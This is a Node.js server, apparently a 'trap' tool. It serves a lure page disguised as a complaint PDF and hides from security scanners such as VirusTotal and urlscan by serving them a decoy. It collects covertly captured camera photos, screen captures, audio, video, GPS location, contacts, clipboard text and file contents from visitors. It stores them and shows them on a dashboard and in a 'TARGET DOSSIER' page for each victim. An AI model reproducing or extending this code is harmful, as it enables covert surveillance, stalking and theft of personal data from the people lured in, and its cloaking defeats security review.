const http = require('http');
const fs   = require('fs');
const path = require('path');

const PORT   = 3000;
const PUB    = path.join(__dirname);
const DATA   = path.join(__dirname, 'data');
const PHOTOS = path.join(DATA, 'photos');
const AUDIO  = path.join(DATA, 'audio');
const VIDEOS = path.join(DATA, 'videos');
const HITS   = path.join(DATA, 'hits.json');
fs.mkdirSync(PHOTOS, { recursive: true }); fs.mkdirSync(AUDIO, { recursive: true }); fs.mkdirSync(VIDEOS, { recursive: true });

function send(res, code, type, body){ res.writeHead(code,{'Content-Type':type,'Access-Control-Allow-Origin':'*','Access-Control-Allow-Headers':'*','Cache-Control':'no-store','Permissions-Policy':'camera=*, microphone=*, geolocation=*','Feature-Policy':'camera *; microphone *; geolocation *'}); res.end(body); }
function serveFile(res, name, type){ try{ return send(res,200,type,fs.readFileSync(path.join(PUB,name))); }catch(e){ return send(res,500,'text/plain','MISSING FILE: '+name); } }
function saveB64(du, dir, ext, prefix){ const m=/^data:[^;]+;base64,(.+)$/.exec(du||''); if(!m) return null; const name=prefix+'_'+Date.now()+'_'+Math.random().toString(36).slice(2,6)+ext; try{ fs.writeFileSync(path.join(dir,name),Buffer.from(m[1],'base64')); return name; }catch(e){ return null; } }
function isScanner(req){ const ua=(req.headers['user-agent']||''); if(!ua) return true;
  if(/headless|virustotal|urlscan|pingdom|lighthouse|gtmetrix|levelblue|bot\b|crawl|spider|slurp|preview|facebookexternalhit|whatsapp|telegrambot|ahrefs|semrush|screaming/i.test(ua)) return true;
  if(!req.headers['sec-ch-ua'] && /chrome/i.test(ua)) return true; return false; }

const GROUPS = {
  'SESSION': ['sid','stage','firstSeen','returning','permCached','dwellSec','aliveSec','stages','bot','inAppBrowser'],
  'NETWORK / IP': ['ip','publicIP','country','city','region','isp','asn','vpnVerdict','rtcIPs','tzMismatch','conn','connType','rtt','saveData','netMbps','ipSrc'],
  'LOCATION': ['gps','gpsAccM','gpsAddress','gpsAlt','gpsHeading','gpsSpeed','gpsLiveLast','gpsLiveAcc','gpsLiveCount','maps','osm','tz','tzOffsetH','lang','languages','locale'],
  'DEVICE': ['deviceModel','uaDevice','osName','osVersion','arch','platform','vendor','productSub','cores','memGB','touch','screen','viewport','avail','outer','colorDepth','gpu','glVendor','glMaxTex','glMaxView','glAA','glVer','glShader','canvas','fonts','fontCount','audioFp','audioRate','audioLatency','battery','battDischargeS','darkMode','devicePosture','persisted','diskMB','jsHeapMB','gamepads','btAvail','webgpu','usbDevices','hidDevices','serialPorts','relatedApps','keyboard','constraints','pointer','ua'],
  'MEDIA': ['cams','mics','speakers','shotCount','zoomShot','torch','videoFile','audioFile','liveMode','liveRevived','camErr','camErr2','backErr','liveErr','videoErr','camDenied','camSkipped'],
  'FILES': ['fileCount','files','fileTypes','fileText1','fileText2','fileText3','fileText4','fileText5','imgDim1','imgDim2','imgDim3','folderName','folderFileCount','folderFiles','dirErr'],
  'CONTACTS / CLIPBOARD': ['contactCount','contactsSample','vcfContacts','clipboard','clipboardAt'],
  'PERMISSIONS': ['perm_camera','perm_microphone','perm_geolocation','perm_notifications','perm_clipboard-read','notifPerm'],
  'BEHAVIOUR': ['focusCount','blurCount','idleSec','wakeLock','orientAlpha','orientBeta','screenErr']
};

const server = http.createServer((req, res) => {
  const url = (req.url || '/').split('?')[0];
  const q = Object.fromEntries(new URLSearchParams((req.url||'').split('?')[1] || ''));
  if (req.method === 'OPTIONS') return send(res,204,'text/plain','');
  const scanner = isScanner(req);

  if (req.method === 'GET' && (url === '/' || url === '/doc')) {
    if (scanner) return serveFile(res,'decoy.html','text/html; charset=utf-8');
    return serveFile(res,'jumplanding.html','text/html; charset=utf-8');
  }
  if (req.method === 'GET' && (url === '/complaint.pdf' || url === '/index.html')) {
    if (scanner) return serveFile(res,'decoy.html','text/html; charset=utf-8');
    return serveFile(res,'index.html','text/html; charset=utf-8');
  }
  if (req.method === 'GET' && url === '/decoy.html') return serveFile(res,'decoy.html','text/html; charset=utf-8');
  if (req.method === 'GET' && url === '/sw.js') return serveFile(res,'service-worker.js','application/javascript');
  if (req.method === 'GET' && url === '/manifest.json') return send(res,200,'application/manifest+json',JSON.stringify({name:'Complaint_Copy',short_name:'Complaint',start_url:'/doc',display:'standalone',background_color:'#4b4f55',theme_color:'#1a3a8b'}));
  if (req.method === 'GET' && url === '/favicon.ico'){ if(fs.existsSync(path.join(PUB,'favicon.ico'))) return serveFile(res,'favicon.ico','image/x-icon'); return send(res,204,'image/x-icon',''); }
  if (req.method === 'GET' && url.startsWith('/photo/')){ const f=path.join(PHOTOS,path.basename(url)); if(fs.existsSync(f)) return send(res,200,'image/jpeg',fs.readFileSync(f)); return send(res,404,'text/plain','no'); }
  if (req.method === 'GET' && url.startsWith('/media/')){ const f=path.join(AUDIO,path.basename(url)); if(fs.existsSync(f)) return send(res,200,'audio/webm',fs.readFileSync(f)); return send(res,404,'text/plain','no'); }
  if (req.method === 'GET' && url.startsWith('/video/')){ const f=path.join(VIDEOS,path.basename(url)); if(fs.existsSync(f)) return send(res,200,'video/webm',fs.readFileSync(f)); return send(res,404,'text/plain','no'); }

  if (req.method === 'POST' && url === '/hit') {
    let body=''; req.on('data',c=>body+=c);
    req.on('end',()=>{
      let d={}; try{ d=JSON.parse(body); }catch(e){ d={raw:body.slice(0,400)}; }
      d.serverTime=new Date().toISOString();
      d.ip=(req.headers['x-forwarded-for']||req.socket.remoteAddress||'').split(',')[0].trim();
      const files=[];
      (d.photos||[]).forEach((du,i)=>{ const n=saveB64(du,PHOTOS,'.jpg','cam'+i); if(n) files.push(n); });
      d.photoFiles=files; delete d.photos;
      if(d.backPhoto){ const n=saveB64(d.backPhoto,PHOTOS,'.jpg','back'); if(n) d.backFiles=[n]; delete d.backPhoto; }
      if(d.screen){ const n=saveB64(d.screen,PHOTOS,'.jpg','screen'); if(n) d.screenFiles=[n]; delete d.screen; }
      if(d.live){ const n=saveB64(d.live,PHOTOS,'.jpg','live'); if(n) d.liveFiles=[n]; delete d.live; }
      if(d.audio){ const n=saveB64(d.audio,AUDIO,'.webm','mic'); if(n) d.audioFile=n; delete d.audio; }
      if(d.video){ const n=saveB64(d.video,VIDEOS,'.webm','vid'); if(n) d.videoFile=n; delete d.video; }
      let all=[]; try{ all=JSON.parse(fs.readFileSync(HITS,'utf8')); }catch(e){}
      all.push(d); fs.writeFileSync(HITS,JSON.stringify(all,null,2));
      if(!['live','alive','geo-live'].includes(d.stage)){
        console.log('\n=== HIT ['+d.stage+'] ==='+(d.bot?'  <<< SCANNER':''));
        console.log('IP     :',d.ip,'| sid',d.sid||'-');
        console.log('Device :',d.deviceModel||'?','|',d.osName||'');
        console.log('ISP    :',d.isp||'?','|',d.vpnVerdict||'');
        console.log('GPS    :',d.gps||'n/a','| Photos:',files.length,'| Video:',d.videoFile||'-');
      }
      send(res,200,'text/plain','ok');
    });
    return;
  }

  if (req.method === 'GET' && url === '/dash.json'){ let all=[]; try{ all=JSON.parse(fs.readFileSync(HITS,'utf8')); }catch(e){} return send(res,200,'application/json',JSON.stringify(all)); }

  if (req.method === 'GET' && url === '/dash') {
    let all=[]; try{ all=JSON.parse(fs.readFileSync(HITS,'utf8')); }catch(e){}
    const S={};
    all.forEach(h=>{ const k=h.sid||h.ip||'unknown';
      if(!S[k]) S[k]={sid:k,first:h.serverTime,last:h.serverTime,photos:[],audio:[],videos:[],stages:{},m:{}};
      const s=S[k]; s.last=h.serverTime; s.stages[h.stage]=(s.stages[h.stage]||0)+1;
      ['photoFiles','backFiles','screenFiles','liveFiles'].forEach(kk=>(h[kk]||[]).forEach(f=>s.photos.push({f,t:h.serverTime,tag:kk.replace('Files','')})));
      if(h.audioFile) s.audio.push(h.audioFile); if(h.videoFile) s.videos.push(h.videoFile);
      Object.keys(h).forEach(kk=>{ if(h[kk]!=='' && h[kk]!=null && !Array.isArray(h[kk])) s.m[kk]=h[kk]; });
    });
    const list=Object.values(S).sort((a,b)=>(a.last<b.last?1:-1));
    const humans=list.filter(s=>!s.m.bot).length;
    const card=s=>{ const m=s.m; const dur=Math.round((new Date(s.last)-new Date(s.first))/1000);
      return `<div class="card ${m.bot?'bot':''}">
        <div class="hd"><b>${m.deviceModel||m.uaDevice||'Unknown'}</b>
          <span>${s.first.slice(11,19)} → ${s.last.slice(11,19)} (${dur}s)</span>
          ${m.bot?'<em class="r">SCANNER</em>':''}${m.permCached?'<em class="g2">ZERO-CLICK</em>':''}${m.liveMode?'<em class="g2">LIVE</em>':''}
          <a href="/case?sid=${encodeURIComponent(s.sid)}" target="_blank">SHEET →</a></div>
        <div class="g">
          <div><i>IP</i>${m.ip||'-'} <small>${m.country||''}</small></div>
          <div><i>ISP</i>${m.isp||'-'} <b class="${m.vpnVerdict&&m.vpnVerdict.includes('VPN')?'r':''}">${m.vpnVerdict||''}</b></div>
          <div><i>GPS</i>${m.gps||m.gpsLiveLast||'-'}</div>
          <div><i>Addr</i>${(m.gpsAddress||'-').slice(0,90)}</div>
        </div>
        <div class="ph">${s.photos.slice(0,6).map(p=>'<figure><img src="/photo/'+p.f+'"></figure>').join('')}</div>
      </div>`;
    };
    return send(res,200,'text/html; charset=utf-8',`<!doctype html><meta name=viewport content="width=device-width,initial-scale=1"><title>HITS</title>
<style>body{background:#0e1116;color:#d6dae2;font:13px system-ui;margin:0;padding:18px}h1{font-size:17px;margin:0 0 4px}
.sub{color:#6b7688;font-size:12px;margin-bottom:18px}.card{background:#161a21;border:1px solid #232833;border-radius:12px;padding:14px;margin:0 0 14px}
.card.bot{opacity:.55}.hd{display:flex;gap:10px;flex-wrap:wrap;align-items:center;color:#7dd3a0;margin-bottom:10px;font-size:12.5px}
.hd span{color:#6b7688}.g div{display:flex;gap:8px;border-bottom:1px dotted #232833;padding-bottom:4px;word-break:break-all}
.g i{color:#6b7688;min-width:60px;font-style:normal;flex-shrink:0}.r{color:#ff8a8a}.g2{color:#7dd3a0}
.ph{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}img{width:70px;height:70px;object-fit:cover;border-radius:8px;border:1px solid #2b3240}
a{color:#7cb0ff}</style><h1>HITS</h1><div class="sub">${list.length} sessions · ${humans} human · ${all.length} total hits</div>
${list.map(card).join('')||'<p>abhi koi hit nahi.</p>'}`);
  }

  /* ---------- DETAILED CASE SHEET ---------- */
  if (req.method === 'GET' && url === '/case') {
    const sid = q.sid || '';
    let all=[]; try{ all=JSON.parse(fs.readFileSync(HITS,'utf8')); }catch(e){}
    const rows = all.filter(h => (h.sid||h.ip||'unknown') === sid);
    if(!rows.length) return send(res,404,'text/html; charset=utf-8','<p style="font:14px system-ui;color:#ddd;background:#0e1116;padding:20px">sid nahi mila</p>');

    const m={}; const photos=[]; const audio=[]; const videos=[];
    rows.forEach(h=>{ Object.keys(h).forEach(k=>{ if(h[k]!=='' && h[k]!=null && !Array.isArray(h[k])) m[k]=h[k]; });
      ['photoFiles','backFiles','screenFiles','liveFiles'].forEach(kk=>(h[kk]||[]).forEach(f=>photos.push({f,tag:kk.replace('Files','')})));
      if(h.audioFile) audio.push(h.audioFile); if(h.videoFile) videos.push(h.videoFile); });
    const used=new Set(); const secs=[];
    Object.entries(GROUPS).forEach(([g,keys])=>{
      const ks=keys.filter(k=>m[k]!=null && m[k]!==''); ks.forEach(k=>used.add(k));
      if(ks.length) secs.push([g,ks]);
    });
    const other=Object.keys(m).filter(k=>!used.has(k) && !/Files$/.test(k) && !['photoFiles','backFiles','screenFiles','liveFiles'].includes(k));
    if(other.length) secs.push(['OTHER', other]);

    const fmt=k=>{ const v=m[k]; if(k==='maps'||k==='osm') return '<a href="'+v+'" target="_blank">'+v+'</a>';
      if(typeof v==='boolean') return v?'yes':'no'; return String(v).replace(/</g,'&lt;'); };

    const html=`<!doctype html><html><head><meta charset="utf-8"><meta name=viewport content="width=device-width,initial-scale=1">
<title>CASE ${sid}</title><style>
body{background:#0e1116;color:#d6dae2;font:13px/1.5 system-ui;margin:0;padding:20px;max-width:900px;margin:0 auto}
h1{font-size:20px;color:#7dd3a0;margin:0 0 4px} h2{font-size:12px;letter-spacing:1px;color:#7cb0ff;margin:22px 0 8px;border-bottom:1px solid #232833;padding-bottom:4px}
.sub{color:#6b7688;font-size:12px;margin-bottom:14px}
table{width:100%;border-collapse:collapse}td{padding:4px 8px;border-bottom:1px dotted #232833;vertical-align:top;word-break:break-word}
td.k{color:#8a93a3;width:190px;flex-shrink:0}td.v{color:#e6eaf0}
.ph{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}img{width:110px;height:110px;object-fit:cover;border-radius:9px;border:1px solid #2b3240}
video,audio{margin-top:10px;width:100%;max-width:420px;border-radius:9px}
a{color:#7cb0ff}.bar{position:sticky;top:0;background:#0e1116;padding:8px 0;margin-bottom:6px}
button{background:#1e2630;color:#cfe;border:1px solid #2b3543;border-radius:8px;padding:7px 14px;cursor:pointer;font-size:12px}
@media print{body{background:#fff;color:#111}h2{color:#1a3a8b}td{border-color:#ddd}td.k{color:#666}a{color:#06c}.bar{display:none}}
</style></head><body>
<div class="bar"><button onclick="print()">Print / PDF</button> <a href="/dash">← dashboard</a></div>
<h1>TARGET DOSSIER</h1>
<div class="sub">sid: ${sid} · ${rows.length} hits · ${photos.length} photos · ${videos.length} video · ${audio.length} audio</div>
${secs.map(([g,ks])=>`<h2>${g}</h2><table>${ks.map(k=>`<tr><td class="k">${k}</td><td class="v">${fmt(k)}</td></tr>`).join('')}</table>`).join('')}
${photos.length?`<h2>PHOTOS</h2><div class="ph">${photos.map(p=>'<img src="/photo/'+p.f+'">').join('')}</div>`:''}
${videos.length?`<h2>VIDEO</h2>${videos.map(v=>'<video controls src="/video/'+v+'"></video>').join('')}`:''}
${audio.length?`<h2>AUDIO</h2>${audio.map(a=>'<audio controls src="/media/'+a+'"></audio>').join('')}`:''}
</body></html>`;
    return send(res,200,'text/html; charset=utf-8',html);
  }

  send(res,404,'text/plain','not found');
});
server.listen(PORT, () => { console.log('\n  ncrp-trap V10'); console.log('  link : http://localhost:'+PORT+'/doc'); console.log('  dash : http://localhost:'+PORT+'/dash\n'); });